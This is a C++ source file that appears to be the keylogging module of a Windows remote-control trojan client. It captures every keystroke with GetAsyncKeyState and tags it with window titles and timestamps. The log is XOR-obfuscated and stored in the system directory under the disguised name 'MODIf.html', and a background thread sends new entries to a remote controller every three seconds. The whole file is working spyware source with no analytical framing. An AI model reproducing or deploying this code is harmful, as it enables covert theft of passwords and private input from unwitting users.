// KeyboardManager.cpp: implementation of the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#include "KeyboardManager.h"
#include <tchar.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#include <iostream>
#include <winbase.h>
#include <winuser.h>
using namespace std;

#define FILE_PATH "\\MODIf.html"
#define CAPTION_SIZE 1024

CKeyboardManager1::CKeyboardManager1(CClientSocket *pClient, int n) : CManager(pClient)
{
    sendStartKeyBoard();
    WaitForDialogOpen();
    sendOfflineRecord();

    GetSystemDirectory(m_strRecordFile, sizeof(m_strRecordFile));
    lstrcat(m_strRecordFile, FILE_PATH);

    m_bIsWorking = true;
    dKeyBoardSize = 0;

    m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger, (LPVOID)this, 0, NULL);
    m_hSendThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendData,(LPVOID)this,0,NULL);
}

CKeyboardManager1::~CKeyboardManager1()
{
    m_bIsWorking = false;
    WaitForSingleObject(m_hWorkThread, INFINITE);
    WaitForSingleObject(m_hSendThread, INFINITE);
    CloseHandle(m_hWorkThread);
    CloseHandle(m_hSendThread);
}

void CKeyboardManager1::OnReceive(LPBYTE lpBuffer, ULONG nSize)
{
    if (lpBuffer[0] == COMMAND_NEXT)
        NotifyDialogIsOpen();

    if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE) {
    }

    if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR) {
        DeleteFile(m_strRecordFile);
        HANDLE hFile = CreateFile(m_strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        CloseHandle(hFile);
        dKeyBoardSize = 0;
    }
}

int CKeyboardManager1::sendStartKeyBoard()
{
    BYTE	bToken[2];
    bToken[0] = TOKEN_KEYBOARD_START;
    bToken[1] = (BYTE)true;

    return Send((LPBYTE)&bToken[0], sizeof(bToken));
}


int CKeyboardManager1::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
    int nRet = -1;
    DWORD	dwBytesLength = 1 + nSize;
    LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);

    lpBuffer[0] = TOKEN_KEYBOARD_DATA;
    memcpy(lpBuffer + 1, lpData, nSize);

    nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
    LocalFree(lpBuffer);

    return nRet;
}

int CKeyboardManager1::sendOfflineRecord(DWORD	dwRead)
{
    int		nRet = 0;
    DWORD	dwSize = 0;
    DWORD	dwBytesRead = 0;
    HANDLE	hFile = CreateFile(m_strRecordFile, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        dwSize = GetFileSize(hFile, NULL);
        dKeyBoardSize = dwSize;
        if (0 != dwRead) {
            SetFilePointer(hFile, dwRead, NULL, FILE_BEGIN);
            dwSize -= dwRead;
        }

        TCHAR *lpBuffer = new TCHAR[dwSize];
        ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);

        // 解密
        for (int i = 0; i < (dwSize/sizeof(TCHAR)); i++)
            lpBuffer[i] ^= '`';

        nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
        delete[] lpBuffer;
    }
    CloseHandle(hFile);
    return nRet;
}


string GetKey(int Key) // 判断键盘按下什么键
{
    string KeyString = "";
    //判断符号输入
    const int KeyPressMask=0x80000000; //键盘掩码常量
    int iShift=GetKeyState(0x10); //判断Shift键状态
    bool IS=(iShift & KeyPressMask)==KeyPressMask; //表示按下Shift键
    if(Key >=186 && Key <=222) {
        switch(Key) {
        case 186:
            if(IS)
                KeyString = ":";
            else
                KeyString = ";";
            break;
        case 187:
            if(IS)
                KeyString = "+";
            else
                KeyString = "=";
            break;
        case 188:
            if(IS)
                KeyString = "<";
            else
                KeyString = ",";
            break;
        case 189:
            if(IS)
                KeyString = "_";
            else
                KeyString = "-";
            break;
        case 190:
            if(IS)
                KeyString = ">";
            else
                KeyString = ".";
            break;
        case 191:
            if(IS)
                KeyString = "?";
            else
                KeyString = "/";
            break;
        case 192:
            if(IS)
                KeyString = "~";
            else
                KeyString = "`";
            break;
        case 219:
            if(IS)
                KeyString = "{";
            else
                KeyString = "[";
            break;
        case 220:
            if(IS)
                KeyString = "|";
            else
                KeyString = "\\";
            break;
        case 221:
            if(IS)
                KeyString = "}";
            else
                KeyString = "]";
            break;
        case 222:
            if(IS)
                KeyString = '"';
            else
                KeyString = "'";
            break;
        }
    }
    //判断键盘的第一行
    if (Key == VK_ESCAPE) // 退出
        KeyString = "[Esc]";
    else if (Key == VK_F1) // F1至F12
        KeyString = "[F1]";
    else if (Key == VK_F2)
        KeyString = "[F2]";
    else if (Key == VK_F3)
        KeyString = "[F3]";
    else if (Key == VK_F4)
        KeyString = "[F4]";
    else if (Key == VK_F5)
        KeyString = "[F5]";
    else if (Key == VK_F6)
        KeyString = "[F6]";
    else if (Key == VK_F7)
        KeyString = "[F7]";
    else if (Key == VK_F8)
        KeyString = "[F8]";
    else if (Key == VK_F9)
        KeyString = "[F9]";
    else if (Key == VK_F10)
        KeyString = "[F10]";
    else if (Key == VK_F11)
        KeyString = "[F11]";
    else if (Key == VK_F12)
        KeyString = "[F12]";
    else if (Key == VK_SNAPSHOT) // 打印屏幕
        KeyString = "[PrScrn]";
    else if (Key == VK_SCROLL) // 滚动锁定
        KeyString = "[Scroll Lock]";
    else if (Key == VK_PAUSE) // 暂停、中断
        KeyString = "[Pause]";
    else if (Key == VK_CAPITAL) // 大写锁定
        KeyString = "[Caps Lock]";

    //-------------------------------------//
    //控制键
    else if (Key == 8) //<- 回格键
        KeyString = "[Backspace]";
    else if (Key == VK_RETURN) // 回车键、换行
        KeyString = "[Enter]\n";
    else if (Key == VK_SPACE) // 空格
        KeyString = " ";
    //上档键:键盘记录的时候，可以不记录。单独的Shift是不会有任何字符，
    //上档键和别的键组合，输出时有字符输出
    /*
    else if (Key == VK_LSHIFT) // 左侧上档键
    KeyString = "[Shift]";
    else if (Key == VK_LSHIFT) // 右侧上档键
    KeyString = "[SHIFT]";
    */
    /*如果只是对键盘输入的字母进行记录:可以不让以下键输出到文件*/
    else if (Key == VK_TAB) // 制表键
        KeyString = "[Tab]";
    else if (Key == VK_LCONTROL) // 左控制键
        KeyString = "[Ctrl]";
    else if (Key == VK_RCONTROL) // 右控制键
        KeyString = "[CTRL]";
    else if (Key == VK_LMENU) // 左换档键
        KeyString = "[Alt]";
    else if (Key == VK_LMENU) // 右换档键
        KeyString = "[ALT]";
    else if (Key == VK_LWIN) // 右 WINDOWS 键
        KeyString = "[Win]";
    else if (Key == VK_RWIN) // 右 WINDOWS 键
        KeyString = "[WIN]";
    else if (Key == VK_APPS) // 键盘上 右键
        KeyString = "右键";
    else if (Key == VK_INSERT) // 插入
        KeyString = "[Insert]";
    else if (Key == VK_DELETE) // 删除
        KeyString = "[Delete]";
    else if (Key == VK_HOME) // 起始
        KeyString = "[Home]";
    else if (Key == VK_END) // 结束
        KeyString = "[End]";
    else if (Key == VK_PRIOR) // 上一页
        KeyString = "[PgUp]";
    else if (Key == VK_NEXT) // 下一页
        KeyString = "[PgDown]";
    // 不常用的几个键:一般键盘没有
    else if (Key == VK_CANCEL) // Cancel
        KeyString = "[Cancel]";
    else if (Key == VK_CLEAR) // Clear
        KeyString = "[Clear]";
    else if (Key == VK_SELECT) //Select
        KeyString = "[Select]";
    else if (Key == VK_PRINT) //Print
        KeyString = "[Print]";
    else if (Key == VK_EXECUTE) //Execute
        KeyString = "[Execute]";

    //----------------------------------------//
    else if (Key == VK_LEFT) //上、下、左、右键
        KeyString = "[←]";
    else if (Key == VK_RIGHT)
        KeyString = "[→]";
    else if (Key == VK_UP)
        KeyString = "[↑]";
    else if (Key == VK_DOWN)
        KeyString = "[↓]";
    else if (Key == VK_NUMLOCK)//小键盘数码锁定
        KeyString = "[NumLock]";
    else if (Key == VK_ADD) // 加、减、乘、除
        KeyString = "+";
    else if (Key == VK_SUBTRACT)
        KeyString = "-";
    else if (Key == VK_MULTIPLY)
        KeyString = "*";
    else if (Key == VK_DIVIDE)
        KeyString = "/";
    else if (Key == 190 || Key == 110) // 小键盘 . 及键盘 .
        KeyString = ".";
    //小键盘数字键:0-9
    else if (Key == VK_NUMPAD0)
        KeyString = "0";
    else if (Key == VK_NUMPAD1)
        KeyString = "1";
    else if (Key == VK_NUMPAD2)
        KeyString = "2";
    else if (Key == VK_NUMPAD3)
        KeyString = "3";
    else if (Key == VK_NUMPAD4)
        KeyString = "4";
    else if (Key == VK_NUMPAD5)
        KeyString = "5";
    else if (Key == VK_NUMPAD6)
        KeyString = "6";
    else if (Key == VK_NUMPAD7)
        KeyString = "7";
    else if (Key == VK_NUMPAD8)
        KeyString = "8";
    else if (Key == VK_NUMPAD9)
        KeyString = "9";
    //-------------------------------------------//

    //-------------------------------------------//
    //*对字母的大小写进行判断*//
    else if (Key >=97 && Key <= 122) { // 字母:a-z
        if (GetKeyState(VK_CAPITAL)) { // 大写锁定
            if(IS) //Shift按下:为小写字母
                KeyString = Key;
            else // 只有大写锁定:输出大写字母
                KeyString = Key - 32;
        } else { // 大写没有锁定
            if(IS) // 按下Shift键: 大写字母
                KeyString = Key - 32;
            else // 没有按Shift键: 小写字母
                KeyString = Key;
        }
    } else if (Key >=48 && Key <= 57) { // 键盘数字:0-9及上方的符号
        if(IS) {
            switch(Key) {
            case 48: //0
                KeyString = ")";
                break;
            case 49://1
                KeyString = "!";
                break;
            case 50://2
                KeyString = "@";
                break;
            case 51://3
                KeyString = "#";
                break;
            case 52://4
                KeyString = "$";
                break;
            case 53://5
                KeyString = "%";
                break;
            case 54://6
                KeyString = "^";
                break;
            case 55://7
                KeyString = "&";
                break;
            case 56://8
                KeyString = "*";
                break;
            case 57://9
                KeyString = "(";
                break;
            }
        } else
            KeyString = Key;
    }
    if (Key != VK_LBUTTON || Key != VK_RBUTTON) {
        if (Key >=65 && Key <=90) { //ASCII 65-90 为A-Z
            if (GetKeyState(VK_CAPITAL)) { // 大写锁定:输出A-Z
                if(IS) // 大写锁定，并且按下上档键:输出为小写字母
                    KeyString = Key + 32;
                else //只有大写锁定:输出为大写字母
                    KeyString = Key;
            } else { // 大写没有锁定:a-z
                if(IS) {
                    KeyString = Key;
                } else {
                    Key = Key + 32;
                    KeyString = Key;
                }
            }
        }
    }

    return KeyString;
}

void SaveToFile(TCHAR *strRecordFile, TCHAR *lpBuffer)
{
    HANDLE	hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
                               NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD dwBytesWrite = 0;
    DWORD dwSize = GetFileSize(hFile, NULL);
    if (dwSize < 1024 * 1024 * 50)
        SetFilePointer(hFile, 0, 0, FILE_END);


    // 加密
    int	nLength = lstrlen(lpBuffer);
    TCHAR*	lpEncodeBuffer = new TCHAR[nLength];
    for (int i = 0; i < nLength; i++)
        lpEncodeBuffer[i] = lpBuffer[i] ^ _T('`');
    WriteFile(hFile, lpEncodeBuffer, lstrlen(lpBuffer)*sizeof(TCHAR), &dwBytesWrite, NULL);
    CloseHandle(hFile);

    delete [] lpEncodeBuffer;
    return;
}

BOOL CKeyboardManager1::IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowCaption, TCHAR *szText, bool hasData)
{
    HWND hFocus = GetForegroundWindow();
    BOOL ReturnFlag = FALSE;
    if (hFocus != PreviousFocus) {
        if (lstrlen(WindowCaption) > 0) {
            if (hasData) {
                SYSTEMTIME   s;
                GetLocalTime(&s);
                wsprintf(szText, _T("\r\n[标题:] %s\r\n[时间:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
                    WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
            }
            memset(WindowCaption, 0, CAPTION_SIZE);
            ReturnFlag=TRUE;
        }
        PreviousFocus = hFocus;
        SendMessage(hFocus, WM_GETTEXT, CAPTION_SIZE, (LPARAM)WindowCaption);
    }
    return ReturnFlag;
}

DWORD WINAPI CKeyboardManager1::SendData(LPVOID lparam)
{
    CKeyboardManager1 *pThis = (CKeyboardManager1 *)lparam;

    while(pThis->m_bIsWorking) {
        DWORD dwSize =0;
        HANDLE	hFile = CreateFile(pThis->m_strRecordFile, GENERIC_READ, FILE_SHARE_READ,
                                   NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            dwSize = GetFileSize(hFile, NULL);
        }
        CloseHandle(hFile);

        if (pThis->dKeyBoardSize != dwSize) {
            pThis->sendOfflineRecord(pThis->dKeyBoardSize);
        }

        Sleep(3000);
    }
    return 0;
}

DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
{
    CKeyboardManager1 *pThis = (CKeyboardManager1 *)lparam;

    TCHAR KeyBuffer[2048] = {};
	TCHAR szText[CAPTION_SIZE] = {};
    TCHAR WindowCaption[CAPTION_SIZE] = {};
    HWND PreviousFocus = NULL;
    while(pThis->m_bIsWorking) {
        Sleep(5);
        int num = lstrlen(KeyBuffer);
        if (pThis->IsWindowsFocusChange(PreviousFocus, WindowCaption, szText, num > 0) || num > 2000) {
            bool newWindowInput = strlen(szText);
            if (newWindowInput){// 在新的窗口有键盘输入
                lstrcat(KeyBuffer, szText);
                memset(szText, 0, sizeof(szText));
            }
            if (lstrlen(KeyBuffer) > 0) {
                if (!newWindowInput)
                    lstrcat(KeyBuffer, _T("\r\n"));
                const int offset = sizeof(_T("\r\n[内容:]")) - 1;
                memmove(KeyBuffer+offset, KeyBuffer, strlen(KeyBuffer));
                memcpy(KeyBuffer, _T("\r\n[内容:]"), offset);
                SaveToFile(pThis->m_strRecordFile, KeyBuffer);
                memset(KeyBuffer,0,sizeof(KeyBuffer));
            }
        }
        for(int i = 8; i <= 255; i++) {
            if((GetAsyncKeyState(i)&1) == 1) {
                string TempString = GetKey (i);
                lstrcat(KeyBuffer,TempString.c_str());
            }
        }
    }
    return 0;
}
